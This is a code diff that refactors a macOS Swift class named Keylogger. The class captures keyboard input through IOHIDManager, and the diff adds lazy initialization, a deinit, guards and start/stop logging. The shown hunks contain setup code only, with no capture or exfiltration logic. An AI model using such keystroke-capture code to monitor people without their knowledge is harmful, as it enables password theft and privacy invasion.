@@ -12,11 +12,17 @@ import IOKit.hid
 import Cocoa
 
 class Keylogger {  // TODO: Sometimes all the thing just stops working until I log out and back in
-    var manager: IOHIDManager
+    var manager: IOHIDManager!
     var deviceList = NSArray()
     fileprivate var isStarted = false
+    fileprivate var isInitialized = false
     
-    init() {
+    deinit {
+        stop()
+    }
+    
+    fileprivate func begin() {
+        if isInitialized { return }
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
 
         if (CFGetTypeID(manager) != IOHIDManagerGetTypeID())
@@ -38,6 +44,7 @@ class Keylogger {  // TODO: Sometimes all the thing just stops working until I l
         {
             SystemMethods.log("Couldn't open manager: \(ioreturn)")
         }
+        isInitialized = true
     }
 
     /* For Keyboard */
@@ -54,16 +61,18 @@ class Keylogger {  // TODO: Sometimes all the thing just stops working until I l
     /* Scheduling the HID Loop */
     func start() {
         if isStarted { return }
+        if !isInitialized { begin() }
         IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
+        SystemMethods.log("Keylogger started")
         isStarted = true
     }
     
     /* Un-scheduling the HID Loop */
     func stop() {
-        if !isStarted { return }
+        if !isStarted || !isInitialized { return }
         IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
+        SystemMethods.log("Keylogger stopped")
         isStarted = false
-        print("Stop")
     }
     
     
